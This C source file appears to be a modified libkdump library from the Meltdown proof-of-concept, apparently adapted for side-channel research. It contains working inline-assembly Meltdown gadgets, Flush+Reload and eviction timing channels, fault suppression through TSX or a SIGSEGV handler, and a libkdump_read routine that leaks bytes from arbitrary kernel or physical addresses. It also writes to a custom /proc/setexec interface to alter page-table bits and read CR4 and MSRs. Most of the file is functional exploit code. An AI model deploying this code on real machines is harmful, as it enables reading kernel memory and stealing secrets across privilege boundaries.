#define _GNU_SOURCE
#include "libkdump.h"
#include <cpuid.h>
#include <errno.h>
#include <fcntl.h>
#include <memory.h>
#include <pthread.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <assert.h>

libkdump_config_t libkdump_auto_config = {0};

// ---------------------------------------------------------------------------
static jmp_buf buf;

static char *_mem = NULL, *mem = NULL;
static pthread_t *load_thread;
static size_t phys = 0;
static size_t legal = 0;
static int dbg = 0;

static libkdump_config_t config;

#define EVICTION_SET_LEN 32
static char *_evict = NULL, *evict = NULL;
static size_t evict_phys[EVICTION_SET_LEN] = {0};

int monitor_count;
#define NUM_COUNTERS 2
long long values[NUM_COUNTERS];
long long accumulate_values[NUM_COUNTERS];

static int to_xmm_load_prepare = 0;
static int to_test_kernel_mode = 0;

static int setexec = 0;
static char buffer[40];

static uint64_t ts = 0;

#ifndef ETIME
#define ETIME 62
#endif

#define NO_TSX

#if defined(NO_TSX) && defined(FORCE_TSX)
#error NO_TSX and FORCE_TSX cannot be used together!
#endif

#ifndef NO_TSX
#define _XBEGIN_STARTED (~0u)
#endif

#if defined(__i386__) && defined(FORCE_TSX)
#undef FORCE_TSX
#warning TSX cannot be forced on __i386__ platform, proceeding with compilation without it
#endif

#define MAX_MEASUREMENT 100
#define MAX_WINDOW_SIZE 145

extern const char meltdown_depth_begin[], meltdown_depth_end[];
extern const char meltdown_write_begin[], meltdown_write_end[];
extern const char meltdown_cr_begin[], meltdown_cr_end[];
extern const char meltdown_msr_begin[], meltdown_msr_end[];
extern const char meltdown_xmm_begin[], meltdown_xmm_end[];
extern const char meltdown_xmm_load_begin[], meltdown_xmm_load_end[];
extern const char meltdown_xmm_wait_begin[], meltdown_xmm_wait_end[];
extern const char meltdown_depth_with_tsx_begin[], meltdown_depth_with_tsx_end[];

#ifdef __x86_64__

// ---------------------------------------------------------------------------
#define P_BIT 0
#define RESERVED_BIT 1

#define PKEY_DISABLE_ACCESS 0x1
#define PKEY_DISABLE_WRITE 0x2

// ---------------------------------------------------------------------------
#define meltdown                                                               \
asm volatile("1:\n"                                                          \
	"movq (%%rsi), %%rsi\n"                                         \
	"movzx (%%rcx), %%rax\n"                                         \
	"shl $12, %%rax\n"                                              \
	"jz 1b\n"                                                       \
	"movq (%%rbx,%%rax,1), %%rbx\n"                                 \
	:                                                               \
	: "c"(phys), "b"(mem), "S"(0)                                   \
	: "rax");

// ---------------------------------------------------------------------------
#define meltdown_nonull                                                        \
asm volatile("1:\n"                                                          \
	"movzx (%%rcx), %%rax\n"                                         \
	"shl $12, %%rax\n"                                              \
	"jz 1b\n"                                                       \
	"movq (%%rbx,%%rax,1), %%rbx\n"                                 \
	:                                                               \
	: "c"(phys), "b"(mem)                                           \
	: "rax");

// ---------------------------------------------------------------------------
#define meltdown_fast                                                          \
asm volatile("movzx (%%rcx), %%rax\n"                                         \
	"shl $12, %%rax\n"                                              \
	"movq (%%rbx,%%rax,1), %%rbx\n"                                 \
	:                                                               \
	: "c"(phys), "b"(mem)                                           \
	: "rax");

#else /* __i386__ */

// ---------------------------------------------------------------------------
#define meltdown                                                               \
asm volatile("1:\n"                                                           \
	"movl (%%esi), %%esi\n"                                          \
	"movzx (%%ecx), %%eax\n"                                          \
	"shl $12, %%eax\n"                                               \
	"jz 1b\n"                                                        \
	"mov (%%ebx,%%eax,1), %%ebx\n"                                   \
	:                                                                \
	: "c"(phys), "b"(mem), "S"(0)                                    \
	: "eax");

// ---------------------------------------------------------------------------
#define meltdown_nonull                                                        \
asm volatile("1:\n"                                                          \
	"movzx (%%ecx), %%eax\n"                                         \
	"shl $12, %%eax\n"                                              \
	"jz 1b\n"                                                       \
	"mov (%%ebx,%%eax,1), %%ebx\n"                                  \
	:                                                               \
	: "c"(phys), "b"(mem)                                           \
	: "eax");

// ---------------------------------------------------------------------------
#define meltdown_fast                                                          \
asm volatile("movzx (%%ecx), %%eax\n"                                         \
	"shl $12, %%eax\n"                                              \
	"mov (%%ebx,%%eax,1), %%ebx\n"                                  \
	:                                                               \
	: "c"(phys), "b"(mem)                                           \
	: "eax");
#endif

// ---------------------------------------------------------------------------
#define meltdown_depth                                                          \
asm volatile("sub %%rbx, %%rcx\n"                                             \
	"sub $64, %%rbx\n"                                              \
	"movq (%%rbx), %%rdi\n"                                         \
	"movq (%%rdi, %%rcx, 1), %%rcx\n"                               \
	"movq (%%rdi, %%rcx, 1), %%rcx\n"                                \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	:                                                                \
	: "c"(phys), "b"(mem)                                            \
	: "rax", "rdx", "rdi", "rsi", "r8", "r9", "xmm0", "xmm1");

#ifndef MELTDOWN
#define MELTDOWN meltdown_depth
#endif

// ---------------------------------------------------------------------------
typedef enum { ERROR, INFO, SUCCESS } d_sym_t;

// ---------------------------------------------------------------------------
static void debug(d_sym_t symbol, const char *fmt, ...) {
	if (!dbg)
		return;

	switch (symbol) {
		case ERROR:
		printf("\x1b[31;1m[-]\x1b[0m ");
		break;
		case INFO:
		printf("\x1b[33;1m[.]\x1b[0m ");
		break;
		case SUCCESS:
		printf("\x1b[32;1m[+]\x1b[0m ");
		break;
		default:
		break;
	}
	va_list ap;
	va_start(ap, fmt);
	vfprintf(stdout, fmt, ap);
	va_end(ap);
}

// ---------------------------------------------------------------------------
int status;
int pkey;

static inline void wrpkru(unsigned int pkru)
{
	unsigned int eax = pkru;
	unsigned int ecx = 0;
	unsigned int edx = 0;

	asm volatile(".byte 0x0f,0x01,0xef\n\t"
		: : "a" (eax), "c" (ecx), "d" (edx));
}

int pkey_set(int pkey, unsigned long rights, unsigned long flags)
{
	unsigned int pkru = (rights << (2 * pkey));
	wrpkru(pkru);
	return 0;
}

int pkey_mprotect(void *ptr, int pkey)
{
	int ret;
	// assign pkey to specified page
	snprintf(buffer, sizeof(buffer), "%x %lx", 0x4, (size_t)ptr);
	ret = write(setexec, buffer, strlen(buffer));
	if (ret < 0)
		return ret;

	snprintf(buffer, sizeof(buffer), "%x %x", 0x6, pkey);
	return write(setexec, buffer, strlen(buffer));
}

int pkey_restore(void *ptr)
{
	int ret;
	// re-assign 0 pkey to specified page
	snprintf(buffer, sizeof(buffer), "%x %lx", 0x4, (size_t)ptr);
	write(setexec, buffer, strlen(buffer));
	if (ret < 0)
		return ret;

	snprintf(buffer, sizeof(buffer), "%x %x", 0x6, 0);
	return write(setexec, buffer, strlen(buffer));
}

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
} while (0)

// ---------------------------------------------------------------------------
static inline uint64_t rdtsc() {
	uint64_t a = 0, d = 0;
	asm volatile("mfence");
#if defined(USE_RDTSCP) && defined(__x86_64__)
	asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
#elif defined(USE_RDTSCP) && defined(__i386__)
	asm volatile("rdtscp" : "=A"(a), :: "ecx");
#elif defined(__x86_64__)
	asm volatile("rdtsc" : "=a"(a), "=d"(d));
#elif defined(__i386__)
	asm volatile("rdtsc" : "=A"(a));
#endif
	a = (d << 32) | a;
	asm volatile("mfence");
	return a;
}

#if defined(__x86_64__)
// ---------------------------------------------------------------------------
static inline void maccess(void *p) {
	asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

// ---------------------------------------------------------------------------
static void flush(void *p) {
	asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}
#else
// ---------------------------------------------------------------------------
static inline void maccess(void *p) {
	asm volatile("movl (%0), %%eax\n" : : "c"(p) : "eax");
}

// ---------------------------------------------------------------------------
static void flush(void *p) {
	asm volatile("clflush 0(%0)\n" : : "c"(p) : "eax");
}
#endif

static void l1_evict(void *p) {
	int i, j;
	int no_conflict[EVICTION_SET_LEN];
	uint64_t l1_offset = ((uint64_t)p) & ((1 << 12) - 1);
	uint64_t l2_offset = (libkdump_virt_to_phys((size_t)p) >> 12) & ((1 << 4) - 1);

	// Make sure they don't conflict in L2 with p or with each other
	for (i = 0; i < EVICTION_SET_LEN; i++) {
		if (!evict_phys[i])
			evict_phys[i] = libkdump_virt_to_phys((size_t)(evict + 4096*i));

		uint64_t offset = (evict_phys[i] >> 12) & ((1 << 4) - 1);

		if (offset == l2_offset)
			no_conflict[i] = 0;
		else
			no_conflict[i] = 1;
	}

	for (j = 0; j < 100; j++) {
		for (i = 0; i < EVICTION_SET_LEN; i++) {
			if (no_conflict[i]) {
				maccess(evict + 4096*i + (l1_offset));
			}
			// else
			// 	printf("%d conflicting\n", i);
		}
	}
}

static void *maccess_repeat(void *p) {
	cpu_set_t mask;
	CPU_ZERO(&mask);
	int core_id = 2;
	CPU_SET(core_id, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);

	int i;
	for (i = 0; i < 100; i++)
		maccess(p);
}

static void l2_evict(void *p) {
	flush(p);
	pthread_t th;
	int r = pthread_create(&th, 0, maccess_repeat, p);
	pthread_join(th, 0);
}

// ---------------------------------------------------------------------------
static int __attribute__((always_inline)) flush_reload(void *ptr) {
	uint64_t start = 0, end = 0;

	start = rdtsc();
	maccess(ptr);
	end = rdtsc();

	flush(ptr);

	if (end - start < config.cache_miss_threshold) {
		return 1;
	}
	return 0;
}

static int __attribute__((always_inline)) l1_evict_reload(void *ptr) {
	uint64_t latency;

	asm volatile("rdtscp\n"
		"movq %%rax, %%r8\n"
		"movq (%%rdi), %%rcx\n"
		"rdtscp\n"
		"sub %%r8, %%rax\n"
		: "=a"(latency)
		: "D"(ptr)
		: "r8", "rcx", "rdx");

	l1_evict(ptr);

	if (latency < config.l2_threshold) {
		return 1;
	}
	return 0;
}

static int __attribute__((always_inline)) l2_evict_reload(void *ptr) {
	uint64_t latency;

	asm volatile("rdtscp\n"
		"movq %%rax, %%r8\n"
		"movq (%%rdi), %%rcx\n"
		"rdtscp\n"
		"sub %%r8, %%rax\n"
		: "=a"(latency)
		: "D"(ptr)
		: "r8", "rcx", "rdx");

	l2_evict(ptr);

	if (latency < config.l3_threshold) {
		return 1;
	}
	return 0;
}

static int __attribute__((always_inline)) flush_reload_print(void *ptr) {
	uint64_t latency;

	asm volatile("rdtscp\n"
		"movq %%rax, %%r8\n"
		"movq (%%rdi), %%rcx\n"
		"rdtscp\n"
		"sub %%r8, %%rax\n"
		"clflush (%%rdi)\n"
		: "=a"(latency)
		: "D"(ptr)
		: "r8", "rcx", "rdx");

	printf("latency: %lu\n", latency);

	if (latency < config.cache_miss_threshold) {
		return 1;
	}
	return 0;
}

static int __attribute__((always_inline)) l1_evict_reload_print(void *ptr) {
	uint64_t latency;

	asm volatile("rdtscp\n"
		"movq %%rax, %%r8\n"
		"movq (%%rdi), %%rcx\n"
		"rdtscp\n"
		"sub %%r8, %%rax\n"
		: "=a"(latency)
		: "D"(ptr)
		: "r8", "rcx", "rdx");

	l1_evict(ptr);

	printf("latency: %lu\n", latency);

	if (latency < config.l2_threshold) {
		return 1;
	}
	return 0;
}

static int __attribute__((always_inline)) l2_evict_reload_print(void *ptr) {
	uint64_t latency;

	asm volatile("rdtscp\n"
		"movq %%rax, %%r8\n"
		"movq (%%rdi), %%rcx\n"
		"rdtscp\n"
		"sub %%r8, %%rax\n"
		: "=a"(latency)
		: "D"(ptr)
		: "r8", "rcx", "rdx");

	l2_evict(ptr);

	printf("latency: %lu\n", latency);

	if (latency < config.l3_threshold) {
		return 1;
	}
	return 0;
}

// ---------------------------------------------------------------------------
size_t libkdump_virt_to_phys_kernel_module(size_t virtual_address) {
	snprintf(buffer, sizeof(buffer), "%d %lx", 4, virtual_address);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
int set_reserved_bit(size_t addr) {
	snprintf(buffer, sizeof(buffer), "%d %lx", 3, addr);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
int set_p_flag(size_t addr) {
	snprintf(buffer, sizeof(buffer), "%d %lx", 7, addr);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
int set_rw_flag(size_t addr) {
	snprintf(buffer, sizeof(buffer), "%d %lx", 8, addr);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
int set_xd_flag(size_t addr) {
	snprintf(buffer, sizeof(buffer), "%d %lx", 9, addr);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
int libkdump_load_tlb(size_t addr) {
	snprintf(buffer, sizeof(buffer), "%d %lx", 2, addr);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
int libkdump_flush_tlb(size_t addr) {
	snprintf(buffer, sizeof(buffer), "%d %lx", 1, addr);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
int libkdump_flush_tlb_all() {
	snprintf(buffer, sizeof(buffer), "%d", 0);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
int libkdump_kernel_read_CR4() {
	snprintf(buffer, sizeof(buffer), "%x", 0xa);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
int libkdump_kernel_read_MSR(size_t addr) {
	snprintf(buffer, sizeof(buffer), "%x %lx", 0xb, addr);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
void libkdump_prepare_data_condition(size_t legal_addr, int cache_level, int tlb_present) {
	int ret;
	switch (cache_level) {
		case CACHE_LEVEL_L1:
		maccess((void *)legal_addr);
		break;
		case CACHE_LEVEL_L2:
		maccess((void *)legal_addr);
		l1_evict((void *)legal_addr);
		break;
		case CACHE_LEVEL_L3:
		l2_evict((void *)legal_addr);
		break;
		case CACHE_LEVEL_MEMORY:
		flush((void *)legal_addr);
		break;
		default:
		break;
	}
	asm volatile("mfence");

	if (tlb_present == TLB_PRESENT) {
		ret = libkdump_load_tlb(phys);
	}
	else if (tlb_present == TLB_NOT_PRESENT) {;
		ret = libkdump_flush_tlb(phys);
	}
}

// ---------------------------------------------------------------------------
int libkdump_page_table_set_bit(size_t addr, int bit) {

}

// ---------------------------------------------------------------------------
static void *nopthread(void *dummy) {
	while (1) {
		asm volatile("nop");
	}
}

// ---------------------------------------------------------------------------
static void *syncthread(void *dummy) {
	while (1) {
		sync();
	}
}

// ---------------------------------------------------------------------------
static void *yieldthread(void *dummy) {
	while (1) {
		sched_yield();
	}
}

// ---------------------------------------------------------------------------
static void *fputhread(void *dummy) {
	cpu_set_t mask;
	CPU_ZERO(&mask);
	int core_id = 3;
	CPU_SET(core_id, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);

	while (1) {
		asm volatile("movq $0x42000, %%rax\n"
			"movq %%rax, %%xmm0\n"
			::: "rax");
		sched_yield();
	}
}

#ifndef NO_TSX
// ---------------------------------------------------------------------------
static __attribute__((always_inline)) inline unsigned int xbegin(void) {
	unsigned status;
	//asm volatile("xbegin 1f \n 1:" : "=a"(status) : "a"(-1UL) : "memory");
	asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00" : "=a"(status) : "a"(-1UL) : "memory");
	return status;
}

// ---------------------------------------------------------------------------
static __attribute__((always_inline)) inline void xend(void) {
	//asm volatile("xend" ::: "memory");
	asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory");
}
#endif

// ---------------------------------------------------------------------------
size_t libkdump_virt_to_phys(size_t virtual_address) {
	static int pagemap = -1;
	if (pagemap == -1) {
		pagemap = open("/proc/self/pagemap", O_RDONLY);
		if (pagemap < 0) {
			errno = EPERM;
			return 0;
		}
	}
	uint64_t value;
	int got = pread(pagemap, &value, 8, (virtual_address / 0x1000) * 8);
	if (got != 8) {
		errno = EPERM;
		return 0;
	}
	uint64_t page_frame_number = value & ((1ULL << 54) - 1);
	if (page_frame_number == 0) {
		errno = EPERM;
		return 0;
	}
	return page_frame_number * 0x1000 + virtual_address % 0x1000;
}

// ---------------------------------------------------------------------------
static int check_tsx() {
#if !defined(NO_TSX) && !defined(FORCE_TSX)
	if (__get_cpuid_max(0, NULL) >= 7) {
		unsigned a, b, c, d;
		__cpuid_count(7, 0, a, b, c, d);
		return (b & (1 << 11)) ? 1 : 0;
	} else
	return 0;
#elif defined(FORCE_TSX)
	return 1;
#else /* defined (NO_TSX) */
	return 0;
#endif
}

// ---------------------------------------------------------------------------
static void detect_fault_handling() {
	if (check_tsx()) {
		debug(SUCCESS, "Using Intel TSX\n");
		config.fault_handling = TSX;
	} else {
		debug(INFO, "No Intel TSX, fallback to signal handler\n");
		config.fault_handling = SIGNAL_HANDLER;
	}
}

// ---------------------------------------------------------------------------
static void detect_flush_reload_threshold() {
	size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
	size_t dummy[16];
	size_t *ptr = dummy + 8;
	uint64_t start = 0, end = 0;

	maccess(ptr);
	for (i = 0; i < count; i++) {
		start = rdtsc();
		maccess(ptr);
		end = rdtsc();
		reload_time += (end - start);
	}
	for (i = 0; i < count; i++) {
		start = rdtsc();
		maccess(ptr);
		end = rdtsc();
		flush(ptr);
		flush_reload_time += (end - start);
	}
	reload_time /= count;
	flush_reload_time /= count;

	debug(INFO, "Flush+Reload: %zd cycles, Reload only: %zd cycles\n",
		flush_reload_time, reload_time);
	config.cache_miss_threshold = (flush_reload_time + reload_time * 2) / 3;
	debug(SUCCESS, "Flush+Reload threshold: %zd cycles\n",
		config.cache_miss_threshold);
}

// ---------------------------------------------------------------------------
static void auto_config() {
	debug(INFO, "Auto configuration\n");
	detect_fault_handling();
	detect_flush_reload_threshold();
	config.measurements = 3;
	config.accept_after = 1;
	config.load_threads = 1;
	config.load_type = NOP;
	config.retries = 10000;
	config.physical_offset = DEFAULT_PHYSICAL_OFFSET;
}

// ---------------------------------------------------------------------------
static int check_config() {
	if (config.cache_miss_threshold <= 0) {
		detect_flush_reload_threshold();
	}
	if (config.cache_miss_threshold <= 0) {
		errno = ETIME;
		return -1;
	}
	return 0;
}

// ---------------------------------------------------------------------------
static void unblock_signal(int signum __attribute__((__unused__))) {
	sigset_t sigs;
	sigemptyset(&sigs);
	sigaddset(&sigs, signum);
	sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

// ---------------------------------------------------------------------------
static void segfault_handler(int signum) {
	(void)signum;
	unblock_signal(SIGSEGV);
	longjmp(buf, 1);
}

// ---------------------------------------------------------------------------
libkdump_config_t libkdump_get_autoconfig() {
	auto_config();
	return config;
}

// ---------------------------------------------------------------------------
int libkdump_init(const libkdump_config_t configuration) {
	int j;
	config = configuration;
	if (memcmp(&config, &libkdump_auto_config, sizeof(libkdump_config_t)) == 0) {
		auto_config();
	}

	int err = check_config();
	if (err != 0) {
		errno = err;
		return -1;
	}
	_mem = malloc(4096 * 300);
	if (!_mem) {
		errno = ENOMEM;
		return -1;
	}

	for (j = 0; j < 128; j++) {
		uint64_t *current = (uint64_t *)_mem + j;
		*current = (uint64_t)(current + 1);
	}

	mem = (char *)(((size_t)_mem & ~0xfff) + 0x1000 * 2);
	memset(mem, 0xab, 4096 * 290);

	// should set last cache line as "phys"
	for (j = 0; j < 64; j++) {
		uint64_t *temp = (uint64_t *)(mem + 64 * j);
		*temp = (uint64_t)(mem + 64 * (j+1));
	}

	for (j = 0; j < 256; j++) {
		flush(mem + j * 4096);
	}

	_evict = malloc(4096 * 40);
	if (!_evict) {
		errno = ENOMEM;
		return -1;
	}
	evict = (char *)(((size_t)_evict & ~0xfff) + 0x1000);
	memset(evict, 0xab, 4096 * 32);

	load_thread = malloc(sizeof(pthread_t) * config.load_threads);
	void *thread_func;
	switch (config.load_type) {
		case IO:
		thread_func = syncthread;
		break;
		case YIELD:
		thread_func = yieldthread;
		break;
		case FPU:
		thread_func = fputhread;
		break;
		case NOP:
		default:
		thread_func = nopthread;
	}

	for (j = 0; j < config.load_threads; j++) {
		int r = pthread_create(&load_thread[j], 0, thread_func, 0);
		if (r != 0) {
			int k;
			for (k = 0; k < j; k++) {
				pthread_cancel(load_thread[k]);
			}
			free(load_thread);
			free(_mem);
			errno = r;
			return -1;
		}
	}
	debug(SUCCESS, "Started %d load threads\n", config.load_threads);

	if (config.fault_handling == SIGNAL_HANDLER) {
		if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
			debug(ERROR, "Failed to setup signal handler\n");
			libkdump_cleanup();
			return -1;
		}
		debug(SUCCESS, "Successfully setup signal handler\n");
	}

	setexec = open("/proc/setexec", O_WRONLY);
	assert(setexec >= 0);
	return 0;
}

// ---------------------------------------------------------------------------
int libkdump_cleanup() {
	int j;
	if (config.fault_handling == SIGNAL_HANDLER) {
		signal(SIGSEGV, SIG_DFL);
	}

	for (j = 0; j < config.load_threads; j++) {
		pthread_cancel(load_thread[j]);
	}
	free(load_thread);
	free(_mem);
	debug(SUCCESS, "Everything is cleaned up, good bye!\n");
	return 0;
}

// ---------------------------------------------------------------------------
size_t libkdump_phys_to_virt(size_t addr) {
	/* we are given full address (kernel or physical) here */
	if (addr + config.physical_offset < config.physical_offset)
		return addr;

#ifdef __x86_64__
	/* address given is bigger than identity mapping 64TB  */
	if (addr >= (64ULL * 1024ULL * 1024ULL * 1024ULL * 1024ULL)) {
		debug(ERROR, "phys_to_virt argument is > 64 TB\n");
		return -1ULL;
	}
#endif

	return addr + config.physical_offset;
}

// ---------------------------------------------------------------------------
void libkdump_enable_debug(int enable) { dbg = enable; }

// ---------------------------------------------------------------------------
static int __attribute__((always_inline)) read_value() {
	int i, hit = 0;
	for (i = 0; i < 256; i++) {
		if (flush_reload(mem + i * 4096)) {
			hit = i + 1;
		}
		sched_yield();
	}
	return hit - 1;
}

// ---------------------------------------------------------------------------
int __attribute__((optimize("-Os"), noinline)) libkdump_read_tsx() {
#ifndef NO_TSX
	size_t retries = config.retries + 1;
	uint64_t start = 0, end = 0;

	while (retries--) {
		if (xbegin() == _XBEGIN_STARTED) {
			MELTDOWN;
			xend();
		}
		int i;
		for (i = 0; i < 256; i++) {
			if (flush_reload(mem + i * 4096)) {
				if (i >= 1) {
					return i;
				}
			}
			sched_yield();
		}
		sched_yield();
	}
#endif
	return 0;
}

// ---------------------------------------------------------------------------
int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
	size_t retries = config.retries + 1;
	uint64_t start = 0, end = 0;
	int accessed = 0;

	while (retries--) {
		if (!setjmp(buf)) {
			MELTDOWN;
		}

		int i;
		for (i = 0 ; i < NUM_COUNTERS; i++) {
			accumulate_values[i] += values[i];
		}
		monitor_count++;

		if (monitor_count % 100000 == 0) {
			printf("Read value: ");
			for (i = 0 ; i < NUM_COUNTERS; i++) {
				printf("%f ", (double)accumulate_values[i] / monitor_count);
				accumulate_values[i] = 0;
			}
			printf("; ");
			printf("accessed: %f\n", (double)accessed / monitor_count);
			monitor_count = 0;
			accessed = 0;
		}
	}
	return 0;
}

// ---------------------------------------------------------------------------
int __attribute__((optimize("-O0"))) libkdump_read(size_t addr) {
	phys = addr;

	char res_stat[256];
	int i, j, r;
	for (i = 0; i < 256; i++)
		res_stat[i] = 0;

	for (i = 0; i < config.measurements; i++) {
		if (config.fault_handling == TSX) {
			r = libkdump_read_tsx();
		} else {
			r = libkdump_read_signal_handler();
		}
		res_stat[r]++;
	}
	int max_v = 0, max_i = 0;

	if (dbg) {
		for (i = 0; i < sizeof(res_stat); i++) {
			if (res_stat[i] == 0)
				continue;
			debug(INFO, "res_stat[%x] = %d\n",
				i, res_stat[i]);
		}
	}

	for (i = 1; i < 256; i++) {
		if (res_stat[i] > max_v && res_stat[i] >= config.accept_after) {
			max_v = res_stat[i];
			max_i = i;
		}
	}
	return max_i;
}

// ---------------------------------------------------------------------------
